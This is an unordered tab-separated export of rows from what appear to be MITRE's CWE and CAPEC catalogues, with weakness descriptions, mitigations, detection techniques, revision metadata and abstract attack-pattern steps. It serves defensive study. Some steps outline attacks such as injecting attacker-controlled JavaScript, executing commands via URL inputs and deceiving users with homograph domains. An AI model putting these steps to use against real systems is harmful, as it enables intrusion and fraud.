18103	28	CWE Content Team
13566	42	Configure the application's environment in a way that prevents errors from being generated. For example, in PHP, disable display_errors.
10816	39	2011-03-29
21871	35	MITRE
19327	35	MITRE
9531	103	Primary
16926	95	[Probing] The attacker probes the target application to see whether calling signed code from another language is allowed within a sandbox.
20438	39	2009-05-27
17207	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
13131	28	CWE Content Team
17321	27	The attacker must be able to insert or compromise a system into the processing path for the transaction.
5779	57	Indirect
8802	67	Medium
9058	62	updated Potential_Mitigations
18966	39	2008-07-01
7290	62	updated Relationships, Taxonomy_Mappings
16990	91	Implementation
18522	89	Standard
20048	62	updated Description
13933	28	Eric Dalci
12600	56	ChildOf
18157	39	2008-11-24
7382	101	CAPEC Content Team
9266	35	MITRE
21610	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
6951	39	2010-04-05
7349	35	MITRE
17776	79	Confidentiality
18373	35	MITRE
10027	47	Read Data
11751	62	updated Related_Attack_Patterns
13789	62	updated Related_Attack_Patterns, Relationships, Taxonomy_Mappings
21168	103	Primary
7627	62	updated Description, Relationships, Other_Notes, Taxonomy_Mappings
19054	39	2008-09-08
21441	28	CWE Content Team
19611	56	ChildOf
16491	35	MITRE
9387	42	Always fully authenticate both ends of any communications channel.
5592	81	Confidentiality
15711	39	2019-01-03
23073	35	MITRE
7794	35	MITRE
7861	45	Variant
8345	61	Draft
9982	100	The MITRE Corporation
21815	35	MITRE
7486	62	updated Relationships
13722	35	MITRE
5829	35	MITRE
17056	96	2014-02-13
19002	28	CWE Content Team
23946	26	Implementation
14895	21	PLOVER
25078	91	Implementation
17610	76	2019-04-04
6654	56	ChildOf
12069	39	2019-01-03
8218	69	Incomplete
20622	62	Improved the White_Box_Definition
11172	54	High
17618	59	Updated Related_Attack_Patterns
15079	62	updated Potential_Mitigations, References
8004	23	A product defines a set of insecure permissions that are inherited by objects that are created by the program.
8697	28	CWE Content Team
10526	63	Read Application Data
8303	69	Incomplete
6187	81	Access Control
16042	23	The variable's value is assigned but never used, making it a dead store.
15641	36	http://www.securityfocus.com/archive/1/303509
12821	62	updated Common_Consequences
22235	25	Medium
17928	90	Java
13563	43	Simple
14207	44	SOAR Partial
25386	39	2008-09-08
23087	39	2009-05-27
18522	40	The victim's browser security policies allow at least one of the following JavaScript, Flash, iFrames, ActiveX, or CSS.
23794	61	Stable
13563	45	Base
9785	50	In addition to the traditional input fields, all other user controllable inputs, such as image tags within messages or the likes, must also be subjected to input validation. Such validation should ensure that content that can be potentially interpreted as script by the browser is appropriately filtered.
14736	81	Confidentiality
12964	28	CWE Content Team
10731	28	Eric Dalci
24806	76	2019-04-04
20562	31	699
14361	59	Updated Attack_Motivation-Consequences
6597	31	699
13200	101	CAPEC Content Team
22769	56	ChildOf
17128	62	updated Potential_Mitigations
6571	35	MITRE
7479	81	Integrity
20845	69	Draft
17679	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
18138	35	MITRE
11525	91	Architecture and Design
23026	62	updated Description
15515	42	Carefully manage and protect cryptographic keys (see CWE-320). If the keys can be guessed or stolen, then the strength of the cryptography itself is irrelevant.
7694	26	Architecture and Design
10029	62	updated Potential_Mitigations, Time_of_Introduction
18822	62	updated Demonstrative_Examples, Description, Other_Notes, Potential_Mitigations
10060	55	Seamus Tuohy
22796	28	CWE Content Team
15750	23	An attacker injects content into a server response that is interpreted differently by intermediaries than it is by the target browser. To do this, it takes advantage of inconsistent or incorrect interpretations of the HTTP protocol by various applications. For example, it might use different block terminating characters (CR or LF alone), adding duplicate header fields that browsers interpret as belonging to separate responses, or other techniques. Consequences of this attack can include response-splitting, cross-site scripting, apparent defacement of targeted sites, cache poisoning, or similar actions.
12496	39	2013-02-21
9045	62	updated Relationships
20608	28	CWE Content Team
11028	88	Exposure of Private Information ('Privacy Violation')
7143	28	CWE Content Team
10802	79	Authentication
17405	45	Base
8518	62	updated Demonstrative_Examples, Potential_Mitigations, References, Relationships
12132	28	CWE Content Team
12019	69	Incomplete
23845	25	Low
7975	102	ChildOf
22709	62	updated Demonstrative_Examples, Potential_Mitigations, References
22035	101	CAPEC Content Team
22383	28	CWE Content Team
22572	51	2014-06-23
19208	28	CWE Content Team
25102	35	Cigital
9668	35	MITRE
23929	53	The MITRE Corporation
14612	62	updated Relationships, Taxonomy_Mappings
5588	78	Medium
8307	78	Medium
23628	90	Language-Independent
10651	62	updated Potential_Mitigations
20007	26	Operation
17505	39	2018-03-27
10794	103	Primary
17188	81	Integrity
13981	62	updated Relationships
23957	57	Primary
10930	35	MITRE
23406	45	Variant
14387	45	Base
10173	46	Certain types of Intents, identified by action string, can only be broadcast by the operating system itself, not by third-party applications. However, when an application registers to receive these implicit system intents, it is also registered to receive any explicit intents. While a malicious application cannot send an implicit system intent, it can send an explicit intent to the target application, which may assume that any received intent is a valid implicit system intent and not an explicit intent from another application. This may lead to unintended behavior.
19338	62	updated References
6381	86	https://en.wikipedia.org/wiki/Connection_pool
13550	40	The attacker must be able to insert a listener actively (proxying the communication) or passively (sniffing the communication) in the client-server communication path.
8028	28	CWE Content Team
10351	62	updated Common_Consequences
14417	63	Hide Activities
22665	77	Manual Static Analysis - Source Code
9310	39	2011-06-01
15217	42	For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
12605	103	Primary
20625	28	Eric Dalci
7150	39	2008-07-01
6174	97	Transaction or Event Tampering via Application API Manipulation
20878	39	2010-09-27
21625	76	2015-12-07
10867	105	Web Based
13553	102	ChildOf
7117	28	CWE Content Team
16343	96	2009-07-16
19309	102	ChildOf
16907	105	Mobile
8516	28	CWE Content Team
13577	62	updated Alternate_Terms, Name, Relationships, Taxonomy_Mappings
12744	55	CAPEC Content Team
10740	62	updated Common_Consequences, Relationships
23421	39	2011-06-01
12699	31	1000
18998	59	Updated Related_Weaknesses
10888	28	CWE Content Team
18008	26	Architecture and Design
14930	63	Read Application Data
17298	73	Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.
16793	62	updated Related_Attack_Patterns
25067	46	When the time bomb or logic bomb is detonated, it may perform a denial of service such as crashing the system, deleting critical data, or degrading system response time. This bomb might be placed within either a replicating or non-replicating Trojan horse.
6440	28	CWE Content Team
6327	31	699
12976	39	2017-11-08
17343	39	2009-03-10
9527	35	MITRE
14380	56	ChildOf
5690	28	CWE Content Team
23233	62	updated Relationships
16693	39	2019-06-20
20427	26	Implementation
17842	80	Ability to stealthly gain access via remote compromise or physical access to the manufacturer's documentation.
24265	52	While fuzzing is typically geared toward finding low-level implementation bugs, it can inadvertently find resource exhaustion problems. This can occur when the fuzzer generates a large number of test cases but does not restart the targeted software in between test cases. If an individual test case produces a crash, but it does not do so reliably, then an inability to handle resource exhaustion may be the cause.
19035	23	The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '\..\filename' (leading backslash dot dot) sequences that can resolve to a location that is outside of that directory.
12207	62	updated Demonstrative_Example, Potential_Mitigations, Time_of_Introduction
22588	90	Language-Independent
17404	79	Authorization
19957	62	updated Demonstrative_Examples, Relationships, Taxonomy_Mappings
14461	70	Wikipedia
22224	66	Exploiting Windows Device Drivers
7768	56	CanAlsoBe
14378	47	Read Data
16327	45	Base
14469	28	CWE Content Team
17902	46	The use of low-level functionality can violate the specification in unexpected ways that effectively disable built-in protection mechanisms, introduce exploitable inconsistencies, or otherwise expose the functionality to attack.
11230	89	Detailed
10946	61	Draft
5999	26	Implementation
17993	35	MITRE
13674	102	ChildOf
14430	81	Access Control
10558	28	CWE Content Team
9121	51	2014-06-23
19207	39	2009-10-29
6895	35	MITRE
14431	76	2019-09-30
9349	78	Low
6482	59	Updated References, Related_Weaknesses
17710	62	updated Demonstrative_Examples, Taxonomy_Mappings
18570	39	2012-10-30
13795	28	CWE Content Team
9924	100	The MITRE Corporation
9987	31	1000
13703	102	ChildOf
16355	45	Variant
13193	43	Simple
20269	35	MITRE
23433	62	updated Potential_Mitigations
7618	72	System resources can be quickly consumed leading to poor application performance or system crash. This may affect network performance and could be used to attack other systems and applications relying on network performance.
24620	28	CWE Content Team
16223	62	updated Relationships
20161	76	2015-11-09
9517	39	2008-09-08
6062	55	CAPEC Content Team
20676	24	MITRE
20907	88	Excessive Execution of Sequential Searches of Data Resource
17010	35	MITRE
16024	28	CWE Content Team
12461	42	Avoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.
7109	63	Modify Application Data
9666	39	2014-07-30
17967	28	CWE Content Team
17336	28	CWE Content Team
15928	63	Read Memory
12915	35	MITRE
13512	95	Repeat above steps with enough parameters until the application has been sufficiently mapped out to launch desired attack (for example, Blind SQL Injection)
19200	28	CWE Content Team
8851	23	The application stores sensitive information in cleartext in a cookie.
17594	72	Default error pages gives detailed information about the error that occurred, and should not be used in production environments. Attackers can leverage the additional information provided by a default error page to mount attacks targeted on the framework, database, or other resources used by the application.
10534	21	Anonymous Tool Vendor (under NDA)
14227	62	updated Relationships
20496	39	2013-07-17
8701	39	2011-06-01
13495	59	Updated Description Summary, Related_Attack_Patterns
9374	62	updated White_Box_Definitions
23790	97	File Discovery
20612	72	Be careful using vfork() and fork() in security sensitive code. The process state will not be cleaned up and will contain traces of data from past use.
20078	72	Race conditions such as this kind may be employed to gain read or write access to resources which are not normally readable or writable by the user in question.
22096	39	2009-05-27
11800	31	699
14026	33	Steve Christey
13326	23	Adversary creates duplicates of legitimate websites. When users visit a counterfeit site, the site can gather information or upload malware.
23678	28	CWE Content Team
8661	39	2014-07-30
13090	42	Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.
14062	86	http://seclists.org/fulldisclosure/2006/May/0035.html
10503	42	Use a platform with high-level memory abstractions.
19966	62	updated Common_Consequences
24662	86	http://heine.familiedeelstra.com/security/unserialize
11903	78	Medium
23546	62	updated Applicable_Platforms
14362	81	Integrity
18455	35	MITRE
12767	45	Base
8944	91	Operation
14484	35	MITRE
25216	62	updated Potential_Mitigations, Time_of_Introduction
15354	56	ChildOf
18223	28	CWE Content Team
14710	28	CWE Content Team
8611	28	CWE Content Team
20938	90	Language-Independent
11956	43	Simple
17100	38	You receive any e-mail that provides you with a link which takes you to a website on which you need to enter your log in information.
18075	35	MITRE
17233	28	Eric Dalci
24983	35	MITRE
23048	59	Updated Related_Attack_Patterns
15969	55	CAPEC Content Team
19878	100	The MITRE Corporation
23011	28	CWE Content Team
20619	67	Medium
6735	62	updated Relationships, Other_Notes, Taxonomy_Mappings, Type
13939	104	799
21129	23	The product calls free() twice on the same memory address, potentially leading to modification of unexpected memory locations.
12326	28	CWE Content Team
10554	60	13
22686	26	Architecture and Design
13379	62	updated Potential_Mitigations, Time_of_Introduction
16161	62	updated Time_of_Introduction
18541	62	updated Relationships
21314	28	CWE Content Team
24978	35	MITRE
23693	26	Implementation
12769	69	Draft
6390	97	Passing Local Filenames to Functions That Expect a URL
7472	104	148
25093	76	2018-07-31
12184	97	Evercookie
15777	56	ChildOf
11506	48	12
23248	97	Activity Hijack
8726	74	3
24392	50	Use static analysis tools to find race conditions.
18000	42	Ensure that all format string functions are passed a static string which cannot be controlled by the user and that the proper number of arguments are always sent to that function as well. If at all possible, use functions that do not support the %n operator in format strings. [REF-116] [REF-117]
13751	81	Confidentiality
11789	39	2010-09-27
11282	102	ChildOf
7125	62	updated Relationships
8135	62	updated Common_Consequences, Observed_Examples, References, Relationships
25337	56	ChildOf
19952	57	Indirect
24702	35	MITRE
21308	62	updated Potential_Mitigations
18370	62	updated Demonstrative_Examples
16673	56	ChildOf
8324	28	CWE Content Team
12129	35	MITRE
21091	56	ChildOf
15219	56	ChildOf
10283	61	Stable
13317	63	Modify Application Data
17432	104	122
14832	50	To mitigate this type of an attack, an organization can monitor the typical traffic flow. When spikes in usage occur, filters could examine traffic for indicators of bad behavior with respect to the web servers, and then create firewall rules to deny the malicious IP addresses. These patterns in the filter could be a combination of trained behavior, knowledge of standards as they apply to the web server, known patterns, or anomaly detection. Firewalling source IPs works since the HTTP is sent using TCP so the source IP can't be spoofed; if the source IP is spoofed is, then it's not legitimate traffic. Special care should be taken care with rule sets to ensure low false positive rates along with a method at the application layer to allow a valid user to begin using the service again. Another possible solution is using 3rd party providers as they have experts, knowledge, experience, and resources to deal with the attack and mitigate it before hand or while it occurs. The best mitigation is preparation before an attack, but there is no bulletproof solution as with ample resources a brute force attack may succeed.
8520	62	updated Weakness_Ordinalities
6225	81	Other
12855	104	422
20196	62	updated Relationships
22719	31	699
23441	79	Integrity
19748	28	CWE Content Team
6449	103	Primary
18111	35	MITRE
13473	57	Primary
16053	23	The accidental addition of a data-structure sentinel can cause serious programming logic problems.
10889	96	2018-07-02
13451	39	2009-07-27
11729	39	2017-05-03
9907	62	updated Relationships
18085	63	Unexpected State
10433	62	updated Description, Other_Notes, Potential_Mitigations
12567	50	Implementation: Employ DNS resolvers that prevent external names from resolving to internal addresses.
16608	86	http://projects.webappsec.org/w/page/13246943/Insufficient-Process-Validation
12887	31	1000
9165	62	updated Common_Consequences
16791	35	MITRE
7869	35	MITRE
19498	35	MITRE
10626	39	2012-05-11
11766	102	ChildOf
14642	39	2012-10-30
8678	53	The MITRE Corporation
17734	81	Access Control
17153	39	2009-01-12
6720	62	updated Common_Consequences, Relationships
25359	31	699
15144	76	2017-05-01
24544	21	CLASP
18863	101	CAPEC Content Team
11463	62	updated Demonstrative_Examples, Potential_Mitigations, Relationships
20454	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
11812	25	Low
5838	57	Primary
12327	103	Primary
10945	63	Execute Unauthorized Code or Commands
15372	28	CWE Content Team
8951	28	CWE Content Team
22821	32	IMC 2014
19668	28	CWE Content Team
19038	69	Incomplete
25005	90	Java
6805	62	updated Relationships
15659	28	CWE Content Team
6967	56	CanAlsoBe
18839	28	CWE Content Team
11239	28	CWE Content Team
9129	35	MITRE
14043	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
16106	62	updated Relationships
21340	39	2010-02-16
9019	31	699
14544	31	1000
13870	35	MITRE
19109	45	Base
16077	39	2008-09-08
16875	56	ChildOf
10850	21	CLASP
20232	103	Primary
7146	31	1000
16096	92	Experiment
17840	39	2008-09-08
13045	51	2017-04-15
8248	91	Implementation
17205	35	MITRE
15266	103	Primary
19763	45	Compound
9809	76	2017-08-04
14671	35	MITRE
22289	61	Draft
18343	104	283
13850	99	Information Sciences Institute
24370	101	CAPEC Content Team
6544	33	Ryan Berg
12824	28	CWE Content Team
17399	75	Detection techniques for buffer-related errors are more mature than for most other weakness types.
23234	39	2013-07-17
18214	39	2011-06-01
14747	79	Confidentiality
22883	69	Draft
24927	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)                            Formal Methods / Correct-By-Construction
19871	28	CWE Content Team
20767	86	http://websec.io/2012/08/27/Preventing-XXE-in-PHP.html
24249	39	2012-10-30
19894	39	2008-09-08
20685	28	CWE Content Team
15086	39	2010-12-13
23568	66	Third Generation Exploits
17325	35	MITRE
12850	35	MITRE
16070	62	updated Relationships, Taxonomy_Mappings
17741	35	Cigital
7656	62	updated Relationships, Taxonomy_Mappings
10309	49	2005
25169	42	Use parameterized XPath queries (e.g. using XQuery). This will help ensure separation between data plane and control plane.
16170	31	1000
9372	63	Modify Memory
23398	35	MITRE
8016	35	MITRE
18234	28	CWE Content Team
21965	26	Architecture and Design
24757	62	added/updated demonstrative examples
21380	35	MITRE
18597	91	Implementation
10751	31	1000
20717	39	2008-07-01
10896	62	updated Potential_Mitigations
22773	56	ChildOf
20400	70	Retaining Sandbox Containment Despite Bugs in Privileged Memory-Safe Code
10797	28	CWE Content Team
6284	54	Medium
18587	90	Language-Independent
7650	76	2019-09-30
22849	35	MITRE
23005	76	2015-11-09
17159	45	Base
8588	28	CWE Content Team
10183	35	MITRE
6103	103	Primary
21238	89	Detailed
6608	61	Stable
17875	28	CWE Content Team
21197	39	2008-11-24
5927	30	Benne de Weger
14575	31	1000
20629	95	[Explore resolver caches] Check DNS caches on local DNS server and client's browser with DNS cache enabled.
9823	35	MITRE
20636	42	Avoid using CRLF as a special sequence.
9226	39	2008-10-14
24591	46	This issue makes it more difficult to understand and/or maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.   While the interpetation of "large number of parameters." may vary for each product or developer, CISQ recommends a default maximum of 7 parameters/arguments.
22178	35	MITRE
25209	35	MITRE
18861	35	MITRE
20484	62	updated Potential_Mitigations, Time_of_Introduction
6026	91	Implementation
15681	23	The lack of entropy available for, or used by, a Pseudo-Random Number Generator (PRNG) can be a stability and security threat.
8009	28	CWE Content Team
19160	28	CWE Content Team
23371	28	CWE Content Team
23644	101	CAPEC Content Team
18587	46	When creating commands using interpolation into a string, developers may assume that only the arguments/options that they specify will be processed.  This assumption may be even stronger when the programmer has encoded the command in a way that prevents separate commands from being provided maliciously, e.g. in the case of shell metacharacters.  When constructing the command, the developer may use whitespace or other delimiters that are required to separate arguments when the command. However, if an attacker can provide an untrusted input that contains argument-separating delimiters, then the resulting command will have more arguments than intended by the developer.  The attacker may then be able to change the behavior of the command.  Depending on the functionality supported by the extraneous arguments, this may have security-relevant consequences.
13257	28	Eric Dalci
23030	96	2013-06-11
7694	34	Authorization weaknesses may arise when a single-user application is ported to a multi-user environment.
23367	101	CAPEC Content Team
12209	47	Modify Data
24359	28	CWE Content Team
24122	90	Language-Independent
11087	91	Architecture and Design
10851	28	CWE Content Team
12844	45	Base
12434	43	Simple
7053	23	The software uses an IP address for authentication.
22274	70	Why is it Taking so Long to Secure Internet Routing?
9597	94	Run Arbitrary Code
14084	39	2008-10-14
15188	92	Experiment
13495	101	CAPEC Content Team
17046	55	CAPEC Content Team
7247	39	2008-10-14
7130	63	Read Application Data
9834	58	Cryptographic algorithms are the methods by which data is scrambled. There are a small number of well-understood and heavily studied algorithms that should be used by most applications. It is quite difficult to produce a secure algorithm, and even high profile algorithms by accomplished cryptographic experts have been broken.                Since the state of cryptography advances so rapidly, it is common for an algorithm to be considered "unsafe" even if it was once thought to be strong. This can happen when new attacks against the algorithm are discovered, or if computing power increases so much that the cryptographic algorithm no longer provides the amount of protection that was originally thought.
16219	51	2018-04-26
20726	63	Execute Unauthorized Code or Commands
5719	25	Medium
25380	39	2011-06-01
7684	28	CWE Content Team
11992	28	CWE Content Team
19589	62	updated Relationships
11734	39	2014-07-30
12084	103	Primary
20039	34	Some applications use the same ActionForm for more than one purpose. In situations like this, some fields may go unused under some action mappings.
17167	35	MITRE
23748	103	Primary
18279	39	2014-07-30
23249	43	Simple
20625	35	Cigital
14613	28	CWE Content Team
17066	62	updated Potential_Mitigations
11264	28	CWE Content Team
13756	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Fuzz Tester                            Framework-based Fuzzer                                                                     Cost effective for partial coverage:                                                                           Host Application Interface Scanner                            Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious
10384	40	The forcibly browseable pages or accessible resources must be discoverable and improperly protected.
14556	28	CWE Content Team
18823	95	[Deceive user into visiting domain] Finally, the adversary needs to deceive a user into visiting the Homograph domain.
17133	42	Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.
11100	35	Cigital
5926	49	1995
14886	28	CWE Content Team
17652	86	http://www.exploitingsoftware.com/
19432	39	2012-10-30
21033	48	02
7167	100	The MITRE Corporation
8984	101	CAPEC Content Team
9094	56	ChildOf
18752	31	1000
6219	81	Other
15345	28	CWE Content Team
24384	39	2008-10-14
14513	61	Draft
16160	28	CWE Content Team
9337	24	MITRE
21526	51	2014-06-23
22169	73	Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.
24551	91	Implementation
20668	81	Confidentiality
15538	56	ChildOf
17211	62	updated Relationships
5709	45	Variant
5639	35	MITRE
5851	95	[Execute malicious commands] Using the identified URL inputs that allow local command execution, execute malicious commands.
7838	40	Vulnerable DNS software or improperly protected hosts file or router that can be poisoned
13912	40	This type of attack requires the existence of a physical target that an adversary believes hosts something of value.
19349	62	updated Related_Attack_Patterns
12816	62	updated Applicable_Platforms, Description, Observed_Examples, Other_Notes, Potential_Mitigations, Relationship_Notes, Relationships, Research_Gaps, Taxonomy_Mappings, Weakness_Ordinalities
13322	104	1118
24022	31	1000
13154	42	For each and every data access, ensure that the user has sufficient privilege to access the record that is being requested.
5859	39	2012-05-11
17145	90	Language-Independent
9755	100	The MITRE Corporation
15979	35	MITRE
11001	91	Implementation
12854	74	5
11661	28	Eric Dalci
25292	28	CWE Content Team
9959	61	Stable
12661	39	2017-01-19
16337	56	CanPrecede
20193	27	None: No specialized resources are required to execute this type of attack.
18944	39	2013-02-21
8529	104	1103
12648	102	ChildOf
24613	78	Low
18943	35	MITRE
18422	69	Draft
20991	70	Writing Secure Code
9078	72	Errors that are not properly reported could place the system in an unexpected state that could lead to unintended behaviors.
23309	55	CAPEC Content Team
18285	56	ChildOf
21584	62	updated Type
21079	69	Draft
15499	62	updated Description, Relationships, Taxonomy_Mappings, Weakness_Ordinalities
20758	62	updated Potential_Mitigations, Time_of_Introduction
9843	23	The software uses a large data table that contains an excessively large number of      indices.
7532	28	CWE Content Team
11375	101	CAPEC Content Team
12699	103	Primary
8345	40	Access to the manufacturer's documentation.
25356	35	MITRE
13489	103	Primary
22690	39	2008-09-08
7269	45	Variant
6175	35	MITRE
18483	39	2011-06-01
21945	28	CWE Content Team
23317	35	MITRE
23548	35	MITRE
14618	43	Simple
6756	39	2012-05-11
9303	42	Ensure that you use proper file permissions. This can be achieved by using a safe temp file function. Temporary files should be writable and readable only by the process that owns the file.
15368	36	https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
16667	28	Eric Dalci
11985	73	Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.
10595	28	CWE Content Team
18102	39	2011-06-01
6875	103	Primary
16326	43	Simple
6612	73	If needed, the adversary explores an organization's network to determine if any specific systems of interest exist.
22068	73	The attacker executes the function or accesses the data not authorized to him.
24185	55	CAPEC Content Team
11996	69	Draft
6486	39	2011-03-29
15610	23	The software does not implement sufficient measures to prevent multiple failed authentication attempts within in a short time frame, making it more susceptible to brute force attacks.
7560	42	Use a mechanism for determining the strength of a password and notify the user of weak password use.
13989	42	Use technologies for preventing buffer overflows.
8020	62	updated Applicable_Platforms
22258	35	MITRE
9463	62	updated Demonstrative_Examples, Potential_Mitigations, References, Relationships
7393	23	The code uses a variable that has not been initialized, leading to unpredictable or unintended results.
25338	39	2011-06-01
7175	39	2008-07-01
23029	104	234
14431	100	The MITRE Corporation
12306	25	Low
16663	39	2012-05-11
20997	88	Use of Incorrect Operator
16641	35	MITRE
18187	101	CAPEC Content Team
8621	39	2008-09-08
10295	62	updated Description, Observed_Examples
19998	79	Availability
12111	59	Updated Related_Attack_Patterns
20273	54	Low
11248	51	2014-06-23
21287	62	updated Demonstrative_Examples
5899	55	CAPEC Content Team
20119	23	The software reads or writes to a buffer using an index or pointer that references a memory location prior to the beginning of the buffer.
19741	21	PLOVER
10349	28	CWE Content Team
19050	62	updated Time_of_Introduction
15651	31	699
6511	45	Base
15671	31	1000
22190	39	2009-07-27
21340	28	CWE Content Team
20712	62	updated Potential_Mitigations
16967	86	http://web.mit.edu/Saltzer/www/publications/protection/
8808	62	updated Potential_Mitigations, Time_of_Introduction
6011	69	Incomplete
16795	104	619
9910	62	updated Applicable_Platforms
13618	35	MITRE
6409	81	Integrity
9224	33	Greg Hoglund
22558	28	CWE Content Team
10263	51	2014-06-23
20574	26	Architecture and Design
7052	56	ChildOf
19229	56	ChildOf
15919	35	MITRE
20838	35	MITRE
9077	35	MITRE
14910	35	MITRE
6507	63	Quality Degradation
24439	35	Cigital
15887	35	MITRE
8177	23	An adversary examines screenshot images created by iOS in an attempt to obtain sensitive information. These images are used by iOS to aid in the visual transition between open applications and improve the user's experience with a device. An application can be at risk even if it properly protects sensitive information when at rest. If the application displays sensitive information on the screen, then the potential exists for iOS to unintentionally record that information in an image file. An adversary can retrieve these images either by gaining access to the image files, or by physically obtaining the device and leveraging the multitasking switcher interface.
7867	24	MITRE
23707	62	updated Description
23970	45	Variant
5855	62	updated Time_of_Introduction
12044	39	2009-07-17
12337	59	Updated Related_Attack_Patterns, Resources_Required
9347	62	updated Alternate_Terms, Description, Name, References, Relationships
7538	28	CWE Content Team
16086	101	CAPEC Content Team
9786	47	Other
22963	76	2017-08-04
8956	47	Modify Data
23399	103	Primary
5682	55	CAPEC Content Team
7696	94	A successful DOM-based XSS attack can enable an adversary run arbitrary code of their choosing, thus enabling a complete compromise of the application.
11147	94	Information Leakage
19466	28	CWE Content Team
8987	63	Read Application Data
19061	28	CWE Content Team
14852	56	ChildOf
7614	89	Standard
10954	74	3
16683	70	The OWASP Application Security Desk Reference
19225	91	Architecture and Design
24289	103	Primary
21176	21	PLOVER
11280	79	Confidentiality
23217	26	Implementation
13312	57	Primary
13401	35	MITRE
24560	45	Base
18350	104	647
14837	79	Integrity
20558	39	2011-03-29
7762	28	CWE Content Team
19439	73	Use spidering software to get copy of web pages on legitimate site.
18631	62	updated Description, Modes_of_Introduction, Other_Notes, Potential_Mitigations, Relationships
23586	35	MITRE
23865	103	Primary
17560	53	The MITRE Corporation
22195	46	While unchecked return value weaknesses are not limited to returns of NULL pointers (see the examples in CWE-252), functions often return NULL to indicate an error status. When this error condition is not checked, a NULL pointer dereference can occur.
18515	28	CWE Content Team
13082	55	CAPEC Content Team
6335	39	2014-07-30
19287	39	2012-05-11
12196	77	Automated Static Analysis
18808	21	CWE Content Team
20845	90	Java
6392	28	CWE Content Team
18808	96	2009-12-04
13444	44	High
11348	50	Use OS-level preventative functionality. Not a complete solution.
16448	39	2012-05-11
17495	35	MITRE
9231	23	The software receives input from an upstream component, but it does not handle or incorrectly handles when an expected special element is missing.
6357	62	updated Relationships, Taxonomy_Mappings
11256	35	MITRE
7123	80	Arbitrary code execution
6288	51	2017-01-12
17107	61	Stable
21930	39	2012-05-11
6468	100	The MITRE Corporation
6409	63	Other
15000	28	CWE Content Team
5925	28	CWE Content Team
22931	35	Veracode
12037	62	updated Time_of_Introduction
22381	63	Read Files or Directories
19078	45	Class
24295	35	MITRE
7852	56	CanAlsoBe
18119	62	updated Relationships
12166	35	MITRE
24618	28	CWE Content Team
22745	35	MITRE
12936	61	Stable
14618	88	Static Member Data Element outside of a Singleton Class Element
6392	35	MITRE
25394	52	This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.                   Specifically, manual static analysis is typically required to find the behavior that triggers the download of code, and to determine whether integrity-checking methods are in use.
16281	47	Modify Data
22425	62	updated References, Relationships
24888	39	2009-07-27
6995	33	Ulf Harnhammar
10784	76	2017-08-04
25002	35	MITRE
22218	35	MITRE
6312	62	updated Applicable_Platforms, Demonstrative_Examples, Description, Enabling_Factors_for_Exploitation, Modes_of_Introduction, Observed_Examples, Relationships
14261	28	CWE Content Team
16862	103	Primary
21781	31	1000
9258	56	ChildOf
10747	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
15956	28	CWE Content Team
10704	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
21982	97	Checksum Spoofing
7506	62	updated Time_of_Introduction
22522	62	updated Relationships
19738	35	MITRE
6863	28	CWE Content Team
12167	31	1000
12062	39	2010-04-05
14663	39	2011-06-01
22548	40	The target application does not verify that a located file is the one it was looking for through means other than the name. Many applications fail to perform checks of this type.
10173	23	The Android application uses a Broadcast Receiver that receives an Intent but does not properly verify that the Intent came from an authorized source.
13284	28	CWE Content Team
12898	63	Reduce Maintainability
24034	39	2017-05-03
16440	39	2009-10-29
14467	104	393
8397	85	509
6275	35	MITRE
19836	26	Implementation
18362	76	2017-08-04
16266	35	MITRE
9085	47	Alter Execution Logic
19848	28	CWE Content Team
8767	62	updated Demonstrative_Examples, Potential_Mitigations, Relationships
7696	79	Availability
6674	39	2008-07-01
14482	91	Implementation
14300	62	updated Observed_Examples
13148	21	CLASP
21029	79	Access Control
8291	72	The most common consequence will be a corruption of the state of the software, possibly leading to a crash or exit. However, if the signal handler is operating on state variables for security relevant libraries or protection mechanisms, the consequences can be far more severe, including protection mechanism bypass, privilege escalation, or information exposure.
17421	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
22525	39	2011-03-29
9775	62	updated Causal_Nature, Relationships
12535	32	The Open Web Application Security Project (OWASP)
6010	62	updated Related_Attack_Patterns, Relationships
13796	80	Cryptanalysis of signature generation algorithm
10437	39	2008-09-08
22631	77	Dynamic Analysis with Automated Results Interpretation
21451	33	Microsoft
10905	56	ChildOf
